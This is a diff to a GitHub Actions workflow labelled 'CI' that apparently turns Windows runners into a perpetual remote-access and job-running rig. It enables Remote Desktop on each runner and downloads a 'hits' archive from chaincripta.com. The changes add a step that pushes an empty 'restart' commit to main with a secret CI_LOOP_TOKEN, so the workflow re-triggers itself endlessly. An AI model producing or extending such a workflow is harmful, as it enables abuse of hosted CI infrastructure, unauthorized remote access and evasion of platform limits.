@@ -3,12 +3,9 @@ name: CI
 on:
   push:
   workflow_dispatch:
-  repository_dispatch:
-    types: [restart]
 
 permissions:
-  contents: read
-  actions: write
+  contents: write
 
 concurrency:
   group: ci-chain
@@ -24,6 +21,10 @@ jobs:
         runner: [1,2,3,4,5]
 
     steps:
+
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.CI_LOOP_TOKEN }}
 
       - name: Enable TS
         run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
@@ -41,7 +42,7 @@ jobs:
       - name: Download latest package
         run: |
           Invoke-WebRequest `
-            "http://chaincripta.com/hits_chaincripta.com_2.zip" `
+            "http://chaincripta.com/hits_chaincripta.com.zip" `
             -OutFile "$env:GITHUB_WORKSPACE\hits.zip"
 
       - name: Restore cache
@@ -144,20 +145,17 @@ jobs:
         if: always() && matrix.runner == 1
         run: |
 
-          Start-Sleep 20
+          git config --global user.name "github-actions"
+          git config --global user.email "actions@github.com"
 
-          Invoke-RestMethod `
-            -Method POST `
-            -Uri "https://api.github.com/repos/${{ github.repository }}/dispatches" `
-            -Headers @{
-              Authorization = "Bearer $env:GITHUB_TOKEN"
-              Accept="application/vnd.github+json"
-              "User-Agent"="GitHubActions"
-            } `
-            -Body '{"event_type":"restart"}'
+          $time = Get-Date -Format "yyyyMMdd-HHmmss"
 
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          Set-Content restart.txt $time
+
+          git add restart.txt
+          git commit -m "restart $time" --allow-empty
+
+          git push https://${{ secrets.CI_LOOP_TOKEN }}@github.com/${{ github.repository }}.git HEAD:refs/heads/main
 
       - name: Resource usage summary
         if: always()
